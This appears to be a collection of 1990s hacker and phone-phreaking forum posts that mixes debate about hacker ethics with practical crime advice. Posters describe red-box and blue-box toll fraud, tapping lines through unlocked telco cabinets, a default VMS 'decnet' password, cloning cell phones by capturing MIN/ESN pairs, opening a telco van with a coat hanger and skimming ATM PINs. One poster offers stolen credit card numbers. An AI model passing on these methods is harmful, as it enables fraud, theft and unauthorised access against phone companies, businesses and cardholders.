 only refrence I've found was from a 'zine called Magick, and the
 info was questionable .
      I'm a mass comm major at a school with no attitude . We have
 the equipment for a station, but we can't get funding for a licence.
 Even if we did, the heads of the department would squash free thought.
 I've got a group of people who want to invest the time involved . We
 just need the info .
      I've been all over the 'Net looking for info, but the kinds of
 things usually listed under "radio" just don't cut it . 
                      Thanx,

There is also a program for DOS + sound blaster called BlueBeep which will 
mix and match tones at whatever frequency you desire.  What I'm planning 
to do is to buy one of those talking Hallmark cards, take it apart, then 
record the red box sound onto the device.  It may just be abusing the

Once again the mentally challenged CERT team has whipped up frenzy among

Basically, it's PANIX reborn.  Like usual, the warning is "hey everyone 
there are nast uebercrackers using the same bugs that were used before 
that we never bothered to tell you how to fix--just warning you again 
folks!"

For the admin that has plenty of time and resources this problem was fixed 
at their own hands before.  But not all admins have plenty of time or 
expertise to patch source code and to fix all the holes that CERT wont 
tell them how to fix.  Some poor admin running10 machines and half of a 
university computer science department isnt going to have the resources to 
do this.

Okay, seeing as I really did not think your shitty little request deserved 
a reply before, I will make a brief one now.

Hacking is NOT, I repeat NOT a revenge tool or how do I crash someones 
system.  Hacking is an art form.  It is exploration, finding a new method 
to obtain something, using an unconventional means to obtain your goal.  
Hacking NEVER invovles trashing a system or revenge.  If that is what you 
think it is then go join the rest of the media bandwagon and 
cybershitheads who don't have the slightest goddamn clue.

It is pretty easy.  I am assuming that you are on a UNIX system.  If you 
are it will be a sinch.  If you are on any other platform, and whould
 similar to what I describe although probably not identical.  There is a 
program that converts 8 bit data to 7 bit data.  I am not sure about the 
techincal shit behind it.  But you take a file such as fiffft.

   uuencode fifft

I am pretty sure this is how it works.  I am a trial and error guy.  If it 
doesn't work the first time, I try something different. If I get skitzed 
out then I just use the man uuencode command (once again if you are on 
unix).  This will tell you how to do it.  Depending on what mail program 
you use the next part is easy.  Once you have the file that is encoded, 
say you are using the mail program do this:

   mail erstaz@axposf.pa.dec.com < [uuencoded filename]

This mails me the file.  If you use pine, then you can just attach the 
file (without encodeing it), or at least I think you can.  Anyway give it 
a try.  If you screw it up, then we will give it another try.  The world 
is not gonna end.

You confused me here...VMS/CMS????  A vax would run VMS yes, but maybe I

Do you mean IBM's VM/CMS??  That is what I think you mean, especially with 
talk of minidisks and such.  If so, forget it.  That info is stored on a 
read only minidisk, you may be able to read it(I doubt it) but you will 
never be able to write anything to it.

VM/CMS is worthless IMHO, I used it for a bit and hated every second of 
it.  Really nothing to do with it unless you love mainframes.  As for VMS, 
don't mess with that much but can find out for you.  Tell me the exact 
version and exact OS.

The only fun thing VM/CMS had(and I think it was fixed) was one annoying 
"security" feature where if you tried to login incorrectly as someone more 
than three times it shut their account down.

There was pandemonium at our uni after the Computer Sci geeks got hold of 
that info...;)

I must say that I so terribly tired of seeing all these newbies asking 
where that can get hacking files. I have read *countless* files and I have 
learned very little from them. If you guys really want to learn how to 
hack then you should first familarize yourself with the type(s) of systems 
you wish to hack? If you want to hack a certain system type (i.e. unix) 
then you should follow the following procedures:
a) Get some information. (libraries, bookstores, etc)
b) Get access. Everyone here appears to have access to the Internet. How 
   are you getting it? School? Pay account? Hacking?
c) Find someone knowledgeable. I know many unix users who have *never* 
   hacked but yet they know enough to do it quite successfully. So you do 
   not need to know other hackers to learn how to hack. I learned from 
   very little. I think I figured the shit out ok.
d) Do not call too many bbs systems. This will get you into a habit of     
   learning little trivial shit.
e) Study the references you have. After you learn how the system works 
   then get in contact with others. Find someone local. Shit I dunno. If   
   anyone here actually sent me mail about a problem they had doing 
   something or trying to figure out something I would help. If I got 
   mail from some dweeb asking if I new any bugs for IRIX I wouldn't waste 
   my time replying..

Do not sit back and expect the people who know the shit to just say 'here' 
and just give you everything you need to know. I worked my ass off to 
learn what I know and I am not about to give somebody help if they just 
want to go netsurfing to see how many systems they can crack in a week. 
The shit just does not work that way and it appears to me that alot of ppl 
think that it does.

Crack a book.
Read it.
If you do not understand something then ask. I'm sure you will get bagged 
on or ignored asking about the newest NFS bug. I'd rip anyone who bagged 
on you for asking a question about something as simple as the format of 
utmp because that involves thinking, C programming, etc.

Well my little lecture has come to an end. I could go on and on about 
hacking pursuits just like my dad does about the army. But would you 
listen?

I doubt it.

Hacking is:
Kicking a little bean bag around with your feet...
Breaking into systems and crashing/trashing them...
Cutting things apart with large blades...
Doing ANYTHING in a way that is non-standard, but gets the job done.
Coughing your guts out and spewing vomit on people...
Breaking into systems and gaining knowledge and access...
 
Hacking is many things to many people.  It is also something that everyone 
has a different opinion about.  Get a clue, and don't run endless 
conversations about "what hacking is".  This is about as pointless as 
asking everyone what Cyberpunk is?

If people ask questions, maybe someone will answer them.  Maybe they 
won't.  Personally, it's more fun for me to run a complete unix system 
with 24 hour net access from my house.  I am not associated with any 
university.  I have learned many things in setting this sustem up, and in 
turn this is helping me find jobs that pay more than any type of hacking I 
can do.  And both options gain me network knowledge that I enjoy.

Ok,I'm with Nomad and Cosmos on this issue,you're probably not going to 
learn shit from some file you ftp. Believe it or not I learned some of my 
best information straaight from the damn manuals(for instance call your 
local dec dealer,they'll send you just about anything you ask them for). 
But hacking is not for revenge,it is for the exploration of digital 
frontiers(oh shit,i'm starting to sound like an issue of wired)and not for 
system crashing.
Do realize if I wiped out every hard drive i had accesses to in my area i 
would just be fucking my self over(besides the poor guy y that cant find 
his thesis pape in his home directory). For example i've had access to a 
local AIX system in my area for about 3 months,I have super user and all 
and could wipe them out if i was a stupid lamer,but instead i do what 
hackers  originally starting out did. I LEAR. Thats right i pull out my 
unix manuals and teach my self to program in shell,c and lisp. Why? you 
ask. If you have to ask you dont understand the hacker ethic,and no matter 
how many textfiles you read and how elite you think you are, you will 
never understand why either.

OK,that was my little rant,OOps,I meant  I LEARN ^ there. If you didnt 
like this thats your opinion,you can rebut me but flaming me will just 
make your self look stupid. Arguments are valid,flames are not. 

Alright VM/CMS is probably the worst OS i have seen in a while. I like the 
minidisks idea but i think Alpha Micro did a better job with AMOS. I'll 
dig up which minidisk exactly its stored in but you usually cant access it 
, in a past phrackthere was an article with evry IBM factory default for 
VM/CMS machines. All the article does is give you logons,so even if you do 
get in you wont know shit(unless,you RTFM)

Ok,I am no where near god like hacker status but i have been experimenting 
with system 75 lately( i mean i've set up pbxs and the sort) but i would 
be very intrested in talking about setting up a bridge with syetm 75 with 
some one.

only su to it.  Auditing is enabled; options vary.  That's
basically it....in 5.x, passwds are in /etc/shadow like
Sys V.  There are a hell of a lot of PD things they could be

tcpwrappers, logging daemons, modified sendmail, ...
I'm not familiar with that site; telnet there or try the

Some versions of finger return a full listing for a person for every tty that
they are logged in on.  So, if a person was logged in a bunch of times (say
using screen or X), you'd get the full spew about them for each tty.

This is kinda braindead, and most modern fingers just list a single line for
each tty a person is on in a single entry for them.

Thorwak:  a lot depends on how your version of finger parses the names
when it does comparisons against passwd entries, such as if you said: 
finger fred3027
finger dan
It would turn up fred3027 (a username match) and possibly all people who's
first or last names began with fred, and then fingering on dan would turn 
up a hit on a username of dan, or any first or last names beginning with 
dan, so with these two finger you could possibly get results such as:
username: fred3027      In real life: Dan Frederick
username: hath2876      In real life: Fred Hathenberg 
**** results from finger fred3027 ***
username: fred3027      In real life: Dan Frederick
username: dan           In real life: Theo Dan
username: litg4567      In real life: Danielle Litgo
If you want to just check on a specific username, most fingers support a
-m option to force username only matches, you may want to give that a try.

...Basically the Blue Box emits a 2600hz tone (hence the zine 2600)
causing the line to go dead and giving you the power of an operator, 
though nowadays telco monitors for that tone. There have been suggestions 
of mixing pink noise with the original signal 3000, but it does not work. 
The only way you can use a blue box today is use it where a line man has 
just installed a new line or tested one cause that tone is still used for 
testing...and that number can use a 2600 signal for about a month before 
it is taken off the telco list. Beige boing is using someone elses line 
through canning...and there is not musch risk as long as you only use that 
line once or twice and the only person who gets screwed is "Ma Bell" as 
the guy whose line you were using only has to pay $50 of the bill you rang 
up...well hope this helps...

Well, Justin, the bluebox is the phreaker's best friend, but 
unfortunately, they are so easily and quickly detected...

It all started back in the '50's when a blind 8-year-old was screwing 
around with 800 numbers on the phone, listening to the recordings.  Well, 
one day, he was habitually whistling while on the phone, and when one of 
the recordings was playing, one of the tones he whistled shut off the 
recording, so he tried experiementing with different tones, and eventually 
people adapted his idea and invented the bluebox, which produces special 
tones, blah blah blah.

    Actually, it is still possible to blue box a number of different ways. 
One method is to get an 800 country code number, and box off of that. 
Another is to do it in an area such that you don't go through a ESS 
station, though this requires more knowledge about the phone system than I 
have. As a disclaimer, I have done neither of these, but I know people who 
have, and still do.

I wish it was that easy!   ON our VMS system, the passwords are encrypted, 
so if you lose/forget your password, they have to totally destroy your 
original one because they can't find it!

You wanna see how VMS has no security?  Just go to any VAX system and 
log in as "decnet".  The default password is "Decnet" and chances are your 
system administrator didn't change it!  I stumbled upon this in our 
school's VAX....and got caught!  Needless to say, they changed the 
password--and FAST!

Yep..you can get an 800 country code and box off that ...its a bit more 
complicated than the ole 2600HZ of yester year...there are different 
freq's for different countries and the timing has to be more exact.
My question is this:
If you're going through an initial 5ESS exchange surely it will
detect you? -ie most of us are on 5ESS or equivently smart exchanges these 
days
even over here in Europe... ;-(
I was reading a technical manual from Northern Telecom on Bluebox 
detection on their DMS 100/200 exchange (I think thats right?) and it
was well scary...once it detected you...the software you were using
had the ability to disconnect the call, or bill you for the call placed
using the new MF tones (the blue box tones..) 
[sorry, thats meant to bwe the software they were using (northern 
Telecom)]

 Funny thing,
     From what I've seen those who brag about their abilities the most
 have few true abilities to brag about. Hacking isn't about speaking loud
 words, it's about doing deeds. Anyone who thinks loudmouthing on BBS's
 is a really great idea needs to get a clue. Better yet, they need to
 read _The Hacker Crackdown_ by Bruce Sterling. Those who can, do. Those
 who can't value volume over action.
     RAgent, get a life man. none of us give a flying f**k how loud you
can type. Say something useful or just keep your mouth shut.

People kept telling me that if you used the  6.49 Mhz crystal on the 
disgustingly infamous Rat Shack dialer, the frequencies "can't" be 
blocked, becasu they are the correct frequencies. Then I learned that the 
combo box doesn't produce a correct quarter anyway, but does five nickels! 
That thing still fools ACTS, but it would never work on an operator, and 
phreaks  need to know this. I considered building a quarter-type red box, 
but I've reconsidered. The combo box conversionn was supposed to be a 
quick hack job to get you red boxing in a hurry, and it worked in this 
respect. But my energy would be better spent making a good quality 
recording from a real pay phone. 
Whoever got the non-memory dialer, using redial to send dimes seems like 
not such a bad idea after all to me. Also, you can open it up and access 
the extra DTMF tones (A-D).
I tried using a tape recordeing without success, but something like DAT 
would do the job, I'll bet.

My frined has a mac program which can generate digital tones using the 
mathematical formulas which determine the tones in the first place.  I 
believe it uses a Fourier series to approximate the tones that crystal 
makes.  Anyway, we fed the tones into my pearlcorder and off to the pay 
phone!  DAT recording through an optical feed would be even better, but a 
DAT recorder costs 800 dollars and the optical line costs another 50, so 
it isn't cheap.  And you would have to have an optical output from the 
mac, or pc (whatever you happen to use).

Does anyone know if something wierd has happened with the tasm from

programs that I have (to prevent lamers from modifying text in the 
program), and I decided to use the example virii from 40hex vol 8. Only 
problem is that I can only get that program to run propperly if i 
singlestep through it, using td386. If I try to run it, it runs head-first 
into an halt instruction, whre the jump should have been. Seems like the 
dosint which was supposed to set the PSP fails.

My system: dos 5.0 (I think, dont really remember, as I've replaced dos 
with linux most of the time). 486dx-33 20mb ram.

btw: does anyone know any i-net sites that cary the 40hex vols after vol 
10? I'm also looking for a site carrying viriis.

I'll make my anon e-mail address, as well as my public-key (pgp) available

Gawd, do you know how long it takes to read all 898 messages in this

I am trying to find a freenet out there somewhere that is _totally_ 
anonymous, where I don't have to send anything in to them, or pay...
NYX is cool, but I don't wanna send id, I tried others too. santafe wants 
me to sign something, and mindvox wants money (like most places) I need at 
least anon mail. I can get mail at launchpad.unc.edu as Night.Stalker, but 
I can't reply or send mail outside the system... Is there anywhere someone 
could point me to which allows me at least a mail account with a name I 
pick, and preferably a Unix account with telnet/ftp? It seems that there 
_used_ to be more anon places, but they all now require ID or something...

DIALOUTS: This seemed to be a hot topic, oh, maybe 600 posts back or so. 
Anyone got sites/lists they wanna trade? Mail> me here (or actually, @ me 
here) I got various lists...Especially looking for 815/708/414/608 if 
there are such avail. I have no outside lines here, so the inet is my only 
link to the world :(

I have thought of anon mail via penet.fi, but that defeats the purpose, as 
sysadmins here at school can still read my mail if they wish since all 
that does is forwards it.

Well, there is stuff out there, but since it is illegal people aren't going
to just out an tell you about the sites (and also, I will censor mail on yabbs
that contains information on pirate ftp sites, because it can make this system
look suspicous as well).  If your interested in talking about hacking, etc,
this system is about as close as your going to get to being a public h/p/a
type system on the net.

There is also irc, which is a chat system, which always has a channel called
#hack.  To get onto it you need to use a client, which you can ftp from 
csd.bu.edu (I think).

steal info from them and run that etc...?



also, with the new card checkers in some stores, where the customer runs 
trheir card thru a small machine slot and then punches in PIN.  Now I 
looked at these before while noone was paying attention it appears that 
they are all networked to a central machine inthe store.  Apperantly this 
is the one making the call out.  What I was wundering is just what could 
we do with one of these if stolen considering thatthey are easily 
snatchable.  Maybe use it for checks, but then I figured that all the 
dialing and merchant number info for hte credit service would be on the 
main server for all of them in the store. Hmmmmm.  Must be something of 
consequence.

No, I can program in C a bit...

I doubt you could really do much with the supermarket machine.  If you 
were going to fake calls out to the bank network, then you could really 
only buy groceries.  I guess you could somehow snag PINs off it, but 
without a card to go along with it, you wouldn't be able to do much.  
Actually, if you have access to a magnetic strip writer, you might be able 
to steal the PIN and any other info off the card as the info is being sent 
out and then encode your own card.  Would that work, cuz I'm not quite 
sure I know what I'm talking about?

Did you see that CNN report a couple of months ago where carders put a 
fake faceplate on bank machines which snatched customers reciepts.  At the 
same time they had a camera in a van recording the PIn number the customer 
s typed in.   Later they got the receipts, made fake cards and used the 
PINs.  That's why you may have noticed banks posting signs reminding 
customers to keep their bank mach. recpts.
 
Of course they got caught, althouhg they did snag close to $100K.

If you're not going to be pulling in a couple mil. I would not recommend 
card scams.

HEHEHE.  Half the 'crackers' just run around with borrowed accounts, 
running scripts they got off usenet, that someone with some knowledge wrote 
and distributed in an effort to close these kinds of holes that allow 
nimrods to go root on School X's/Bank X's/Biz X's machine(s).  That gives 
those who consider themselves true hackers a bad name.  Half would

Salutations,

well, that's what ppl here recommended me to do...
anyway... what type of texts are you referring to?

RFCs? man pages? what? old phrack files? (grin)
well, i've read tons of RFCs and man pages and
books and whatever... but the best thing for
some beginner like me would be to get some
nice help from someone that is knowledgeable.

I believe that is hacker culture is being destroyed
not by feds or any such thing but by old hackers.

Salutations,

I guess you are too inteligent to help someone 
else... but really who cares?

If you don't want to help don't!! Just stop messing
with things that you don't know... instead of
trying to teach me to hack or not... try to
be someone that someone would like to talk
with.

btw, i WOULDN't be here AT ALL if I didn't hack...
so it's not something that I just like doing since
I got nothing else to do! I believe it's not
me that needs a babysitter but someone else.

now I understand why nobody calls you by
your complete name... why bother?

Heheh..cos I like.  In fact, I use it sometimes myself. ;)

And as for your whining about me not helping you, go right ahead and keep 
whining.  Nobody I ever have known throughout the years has ever sat on a 
BBS/#hack and whined and pissed and moaned about noone helping them to 
"hack" etc...  Maybe that's why today we have clueless rejects and the 
"old time bastards".  The old timers refuse to pander to a group of 
weenies that read alt.2600, hang out on #hack and beg for information when 
they can go out and get it for themselves, read and learn.
 
But no.  They would rather sit on their DOS peecee and call BBS systems 
that require stupid tests to see if they know the "proper" groups for 
3l33t access.  They expect a vast section of knowledge to be handed down 
to them on a golden platter...ie, "How do I hack this...".  When you tell 
them to read the RFC, the books, the texts, even the friggin man pages 
they go ballistic.  "Hey, thats not cool youre being a jerk."  Heh, maybe, 
but thats the way we learned and believe me, it works.  
 
But you dont want to hear this.  So flame away, I really do find it 
amusing.  Although I have talked to a few here that actually have a clue..

Give me a break and go somewhere else with this complaining...The main 
part of being a hacker is exploring on your own after you have the general 
knowledge...(I.E reading anything you can get your hands on) Don't just 
learn unix,vax,dec....read system operations and be creative to exploit 
the flaws.......If someone held your hand then YOU wouldn't be hacking...
Do you really think anyone is going to risk going to jail just so they can 
say....I teach people to hack you honor doesn't that count for somthing?

Hmmm, a little post to tie up some ends



cellphones:  well what you could do is go to like your mall or something 
and usually there is at least one little stand or store that is trying to 
sell cell phones and they will attempt to sell you the acces.  All you 
have to do is buy the phone and then when they go to sell the acces to 
you, or when they say you have to have it activated thru them, either just 
tell them NO, or sign the papers and never use it, that way later on you 
just  don't pay it and after awhile you can star playing with that new 
cellphone.  Hee this one bar near here was actually giving them away on 
St. Pattys day to whoever dressed the most liek alephrachaun.  Another 
thing,depnding on size of town is to go to a wholesaler or something liek 
that.


#hack:  ohmygosh.  You can pick up sooooo much stuff from there, just like 
alt.2600, I swear I see at least five scripts a day that let you take over 
Internet, all youhave to do is eecute them on your account.  I swear, Im 
not lying, would a hacker ever bullshit anyone?


sidenote:  Look in a bookstore for this book called _Cyberia_  it's like 
another culture book about cyberspace and it has the fuckin funniest part 
on hackers in it.  The hackers totally pull the guys leg and start telling 
how they fight with TRW tiger teams for the control of the govt systems 
and how they have their notes sunk a few miles off the Atlantic shelf and 
they have people who can get them for them 8)  I ws laffing forever after 
that one.

Promethe:  well if you want to learn Inet tprotocals there is a good 
primer for TCP/IP in a old phrack, as well as n various FYIs at Internic 
and other places, such as rtfm.mit.edu.  Read RFCs FOR REAL, jsut dont say 
you read them, cause if you really did read them you wouldnt have to ask 
about protocols, since almost every single protocol ont he net has a RFC 
for it.

Magstipe readers at grocery stores:
it appears as if most of them ARE connected centrally to a computer 
onsite.  since the registers usually are (to perform matchups between UPC 
and price) and teh credit card thingies are connected to the register, it 
wouldn't be that hard.  i'm sure the verify is performed like they are for 
ordinary verifones.  perhaps the grocery storetems are smart enough to 
"batch process" verifies if more than one is sent at a time.
the new thing they have, at least in the Wash. DC area, is SCAN, which is 
teh "shared check authorization network".. this device reads the numbers 
on the bottom of a check (which is NOT OCR, but instead, MICR) and dials 
up a database run by the SCAN company that performs a verify.. they 
interface with most POS register systems as well..

one thing i've always been thinking about is cracking the PIN on 
atm/credit cards.  yes, i know they're encrypted, but almost all pins are 
4 digits, which leaves only 10,000 possibilities. if I had a magstripe 
reader interface to a computer, and a copy of the encryption algorithm 
(which must be semi-public, for these multitudes of POS devices to perform 
checks), I could crack it on a computer in minimal time..

cell fones on the freeway:
there was a thread in telecom digest a while back, but as I recall the 
devices are low-power (well, i guess all cell-fones are) and they recharge 
daily witha  solar panel on the top of the box.  i wouldn't recommend 
snagging them, as i'm sure they're stripped down, custom models, which 
don't have any features at all.  probably not even a keypad.

Don't you mean cracking?  Hate to be picky, but I consider myself a 
hacker; someone who understands the system that they are on thoroughly--
whether they are breaking into the system or securing it is irrelevant.  
Contrast this with most of the 'gimme-gimme' guys as cosmos says-- they 
don't want to learn, they just want power and bragging rights.

And I learned a whole lot more about security when I broke into 
systems, and a whole lot more anout breaking into systems when I was 
securing them....:)

Groups arent that bad as long sa you realize that you dont even tell them 
about the real shit you do. I mean it's cool to have poele to esily trade 
with alot, but as far as ever actually going into places etc..  I usually 
keep it to me myself and I.  tho I have three freinds, whch started out as 
a group, who I would share alot of stuff withh, but I trust them mroe than 
I would ever trust anyone else, but that's still not enough to let them 
know my real name etc..


I learned more from setting up Linux on a few systems and installing the 
networking software and programming ont hem than I did the whole time I 
was just a newbie cracker stealing passwd files and running Cjack ont hem 
like a lamer.  Then after getting a base you start picking stuff up alot 
faster.  I must admit tho, tha majority of new crack/hackers that I ever 
run into today are sipmply wannabes who want you to hand it all to them on

like this in ftpd.c:)
#ifdef ULTRIX_AUTH
        if ((numfails = ultrix_check_pass(passwd, xpasswd)) < 0) {

        /* The strcmp does not catch null passwords! */

well aparently you didnt do it ever 8)
 
you also need to make sure that youhave a valid MIN/ESN combo.  So you 
don't just switch the ESN.  You have to vampiore other ESSN/MIN combos 
that are valid and switch among them.
 
also the Rad Shack books are not as close to as informative as the 
manufacturers technical manual.

if you just switch ESN then youwont get thru, since when you transmit to 
the cell-0base you transmit the MIN and the ESN which are compared as a 
pair to the ones on record and must be valid together.  Now the thing is 
you can pick up other phones MIN/ESN combos as they tranmit to tower if 
you have a scanner, or suitably modified cellphone.

Are you kidding?  I mean, yeah, it's free, but have you tried any 
recently?  I know from my dealings on this board previously that I have

But the only thing you can really do on a freenet is mail, gopher, that sort

access to a compiler, that sort of thing.  Look for $15-$20/month, flat fee.

 While I was waiting, I heard the distinct dialup sound of a modem and
 the telltale fuzz of information running across the line. There was no
 one in line behind me, and the guy didn't seem in a rush, so I asked
 him if there was a phone line running into his card verification device.
 He let me get a good look at it. Later that evening I returned with a 
 tape recorder and talked the guy into letting me get a recording of the
 tones. I have not yet tried to use my recording, but was curious if 
 anyone out there had fooled with this sort of thing before. The H/P croud
 around here had never heard of anyone experimenting with this before.

Are you serious?
That machine is just a 300 baud modem/computer which connects to the local 
TYMENET or special store connection and confirms a password, transfers you 
credit card information and processes a approval number or decline.
Its similar to the credit card hacker programs of the late 80s.  You log 
onto TYMENET and your computer goes through a algorithm of credit card 
sequences and you get a authorization if it works.

My question to you : What the hell do you plan to do with working credit 
card numbers except log on the pay services (ie. America On-Line,etc).  
If you just want credit card numbers send me bitnet messages and I'll give

A beige box is really just a telephone, any phone will do. Cut the phone 
wire and put alligator clips on the red and green wires. To "beige box" is 
to simply plug in somewhere. Look around for those little grey
 cabinets. Generally a 7/16 inch nut driver will open them like a charm, 
they are usually not locked. The main problem with beige boxing is it is 
kinda obvious-looking.

Yes, it might speed things up a bit.  But not nearly as much as you may think.
The bottleneck becomes dealing with all the processors and what each should
be doing.  Also, rsa129 was ONE two-prime composite.  It happened to be the
one Scientific American chose to base their contest on.  In just the 129
digit realm there are MANY others... let's say that one out of every trillion
numbers is a suitable prime.  That leaves 10^117 choices for a 129 digit key.
Each of which would take all those little computers ANOTHER 8 months, or the 
NSA perhaps several days.

I think the 'weak link' in RSA is how you handle the passwords in real life,
remember what they are, and where and how you handle the decoded information.
The number of processors you throw at a problem doesn't change the problem's
order of magnitude.

First off, they didnt do it on one machine, they just spread it out to a 
bunch of different volounteer machines, which added up alot of proccessing 
time.
 
Also it was a RSA129 key, now take however many bits are in that, and 
subtract aht from 1024 and then take 2 to that power and that's how much 
more difficult it is to break the 1024bit key than the RSA129.
 
for example, if you have a 400bit key, and you crack it, then you want to 
try and crack the 1024bit key, you would have to expend 2^624 times more 
power to do it.  NOw that is a very large number, considering the number 
of estimated moleculs in the universe is less than that.
 
So I say even with the NSAs computing power, which theyget to measure in 
ACRES 8), it would take a long time to crack a 1024 bit key.  Tho one of 
the smaller PGP keys are suggested to be crackable in one year or so if 
the NSA dedicated all of their processing time to it.
 
 
The thing is now, that it is so daunting to do that, they eitehr knock you 
off real quiet like, or they get your passwd to your se3cret key.  If it's 
going to take them that long tim decrypt it, I'm sure they will justget 
you out of the loop some other way.

sorry, can't help you with the freqs.  however this is true, you'll have to
patch into the line directly.  on most bell atlantic phones (or related baby 
bells around the country) they tend to keep their payphones pretty secure, 
making cable access a little tough.  usually the cocots are a little easier
to hit (there is one here that just has the phone wire running out the back
and up the wall into the building its on, how insecure)...  while i wouldn't
reccomend vandalism (saving .25 by destroying stuff that others may use doesn't
seem worth it somehow) cocots are definatly easier to hit...

if you find out anything about the OOB signalling that they use an informative
post would be cool though...i'm just interested to see what sorts of stuff

"only real hacker on Delphi with legit account"
 
your point is 8)

why get a legit account from Delphi?  If your going to get a legit one at 
least go thrua better service than that.

Subject: Out Of Band signalling 101
Date: Sat May  7 11:52:33 1994

after digging thru my rusty trusty telecommunications bible..

ht:  well why would I worry about a COCOT with OOB, since all the charging 
etc.. takes place inside it and it's just another POTS line to it?  But I 
can see where you mean acces to wires is easier, almost laways something 
exposed.  On fortress phones it's difficult, unless you have a concrete 
cutter or something in your pocket.

first inline band signalling -  it is basically control signals from 
office to office INSIDE the voice bandwidth ~~ 300-3100Hz.  These are like 
the 2600Hz signal for the now dead blueboxes, and the 2500Hz for RedBox 
tones.

out of band-  is when the line carries the normal voice bandwidth, and 
also a narrow signaling band, usually only at a single frequency. For 
insance the CCITT Signaling System no. R2 (CCITT is sorta like 
international standards) uses a signalling band of 3825Hz (+-4Hz) of rit's 
OUT of band signalling.

most of you probably know that stuff already.
 
in order to use out of band signalling tho, the telco has to install more 
electronics on both ends.  Now at the local office, that's no problem, but 
that means they need to add it to the payphone if their going to use it 
between them and the office.  So older ones are no problem usually, it's 
the newer ones they are installng, tho I have found that not all of them 
use it.
 
the out of band control signlas are sent thru the voice channel, so ou can 
no longer put a tone generator to the receiver and have it go thru.  You 
need to patch either into the electronics of he signaller itself, or into 
the wires.  This is difficult on payhhones to say the least.
 
I havent figured out waht frequency the telco's are using now for ot of 
badn signalling, as the telco around here isnt using it yet, so the
  I know who work there don't know yet.

You have access through a service like _that_?  God, I hope it's not

First off, I need advice about getting into those wonderful telco vans. 
They have a tendency to lock them around here, but i've been spotting one 
particular van at my local CO out lately. It appears to be broken, but all 
the stuff is still in it.  I already have my very own Linesman handset, so 
what i really want to do is get those manuals in that file cabinet thing 
in the front seat. This particular van is the old style with those little 
triangle windows on the front that tilt in. I cant pick locks and I cant 
just shatter the glass because the CO is right next to an old folks home.
How effective is Duct tape to muffle the sound? Please post any efficient 
ways to get into these vans.

Second, Does anyone know anything abouit this upcoming switch from Cosmos 
to Switch? I've been reading some internal memos about it that i have 
gotten trashing but they mostly just told me about the conversion process.

Third, will it be possible to clip a phone onto fiber lines(I know i cant 
use my handsset, fiber doesnt conduct), and if so, how?

Last, some time this week i will be spending a day down at Southern Bell 
hanging out with the System Administrators on their private PSN, right now 
i'm just waiting for security clearance.

ok, on the van: forget breaking the glass, etc. get yourself a handy-dandy 
coat hanger, straighten out the wire, and make one end into a small hook. 
insert it into the stripping on the window above the lock mechanism, and 
basically yank it around. (It's too hard to tell you exactly how, and it 
shouldn't take you more than 2 minutes just by stumbling around).

you can tap fiber lines, yes ()with a fiber tap, duh). as to using a 
handset w/ it, probably not, mainly because fiber lines are almost never 
used as end lines; generally they are used only as trunks.

Well also fiber carries digital signals too, and also since there trunks 
you have all the neat translating too do.  Basically if you have the 
equipment you can do it, but that's true for anything.

The thing is too wait for them to do the whole fiber to the homes thing, 
which I think is not going to happen anytime really soon, too much money 
to do it all.  But IF it happens then the fun sarts with masive banwidth 
to the home.  long ways away at best tho.

I don't long for the days of fiber in the home. For a few reasons:
First, the flood of true illiterates onto the nets. (let's face it, if you 
can get online here, you're not totally illiterate) Second, the nets 
become commercialized and for profit (i.e. the free ride is already over 
for those not in academic institutions, and soon I fear that refuge will 
be lost as usage fees/pay as you go tolls are instituted). If I start 
having to pay for connect time at UWF, well, fuck it. I'll go back to 
landline BBS's which are free local calls. sure there's not nearly the 
diversity or breadth of services, but it's free.

Finally, I will miss the net and all it's intricacies. No, there's no 
real-time video or such (well, for most of us). But I don't want some kind 
of lubricated pipeline for that sort of stuff. the present day internet is 
much like a river system... with oxbow lakes, large tributaries and tiny 
creeks, backwaters, headwaters, rapids, damns and locks, eddies, and 
whirlpools. It's a place you can get lost in if you don't know where you 
are going. it's not all friendly and technicolor, but then neither is 
"real life." No, I do not look forward to fiber optics as I see it now.

I don'twant the internet to become prodigy.

While I do agree that having a legit acct on delphi of all places is 
cheesy, i think you saying that real hackers don't have legit accounts is 
complete and utter bullshit.  Most of the best hackers have at least one
legit acct for e-mail/net purposes.  Many, like me own there own unix
machines.  It is in fact very unwise to abuse and leech from a system like
it's a 0-day warez board, using it to telnet to all your kewl bbs's and go
on irc.  Using hacked accounts in that manner constantly is lame.  And if
you're only purpose to hack is to maintain you're access to irc and net
bbs's, you should rethink your motives.  Granted you can't play with
unix to its full extent when you have some normal leve; acct on a college
or commercial system.. but that's why people run unix at home like me.
Anyway.. what you expressed is what i consider to be a very kiddie-ish
attitude and not very well supported or thought through..

friends suggest an alternative site for this ? 

    Before this gets censored , i would like to point out that i am not 
asking for a site name for a particular activity , but only a replacement 
for hack-this . I hope htoaster realizes the subtle but important 
difference between these two points .

    Thanking u in advance .

Don't get so concerned, scudder. Cosmos is a dipshit and speaks for

altitude. He apparently has no life, and if he got one then perhaps we 
could get something done around here, but until that happens, I beleive 
the best thing to do is ignore him. 

Say, cosmos: I thought you said you used your red box daily, and now red 
boxers are lame? I myself have used codez in the pastand I see red boxing 
as an improvement. And your article on packet switched networks was 
worthless. Oh, scuze me, if I want you to tell me anything then I want

Um, I dont have a redbox...but Ill run on out and make one right away.  
Worthless as in, you probably couldnt understand it.  Anyhow, you fit the 
bill...if it's not a HOW-TO then its not good.  Thats why Karl Strickland

Cos enough credit, the ornery old bastard. He knows plenty 
about OSs, unix specifically...been around long enough,
i guess. Cos--you heard about plan 9? know anything about it?
I got a redbox, i admit, but it's nothing special, really.
Just use it to call my girlfriend while she's away :'(
I give a lot more credit to people who know x25 networks
and pbx's and are serious about learning how systems work.
I just got my account restored after my sysadmins discovered
a cracked passwd file and ypx and satan and (yep, cos, you 
guessed it) 8lgm and bugtraq scripts and nuke etc. They
also discovered it was 30 megs larger than it was sposed to
be. So no more toolin' around for me, imma learn UNIX the
hard way and set up a box myself, mebbe SLIPed in, running
NetBSD, instead of trying to glean shit from the tons of
scripts and crap people dcc or mail me. 
It's funny, when you think about it, how much you can do
without really understanding how it works. SMTP, fer
example. Hell, any protocol, really. That's why i think all
hackers should try to read as many rfc's as they can,
instead of running programs other people wrote or 
following instructions other people give. That's not
hacking. That's not learning. That's just leeching.

On the right track my friend.  Codez kiddies just don't seem to 
understand that those scripts had to come from somewhere.  Hacking has 
fizzled down to kids running scripts, red box antics, and collectin mags 
to show off at a 2600 meet.  Gone are the inquisitive natures collected 
behind systems hacking.  

And another thing, since when did hacking become collecting cracked 
accounts...pffft.

Hacking, yes.

Cracking, no.  If all you want to do is break into a system grab root and 
do whatever, a couple of scripts can be a handy tool.

